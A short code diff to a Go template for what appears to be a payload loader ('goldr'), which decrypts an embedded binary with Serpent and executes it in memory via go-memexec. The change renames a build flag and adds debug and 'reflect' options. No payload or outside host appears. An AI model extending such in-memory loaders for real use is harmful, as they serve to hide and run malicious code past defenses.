@@ -7,8 +7,15 @@ import (
 	//{{end}}
 	"github.com/coremedic/goldr/pkg/crypter"
 
-	//{{if .Memexec}}
+	//{{if .Spawn}}
+
+	//{{if .Debug}}
 	"os/exec"
+	//{{end}}
+
+	//{{if .Reflect}}
+	// WIP
+	//{{end}}
 
 	"github.com/amenzhinsky/go-memexec"
 	//{{end}}
@@ -50,7 +57,7 @@ func main() {
 	}
 	//{{end}}
 
-	//{{if .Memexec}}
+	//{{if .Spawn}}
 	bin, err := crypter.SerpentDecrypt(cryptbin, key)
 	if err != nil {
 		//{{if .Debug}}
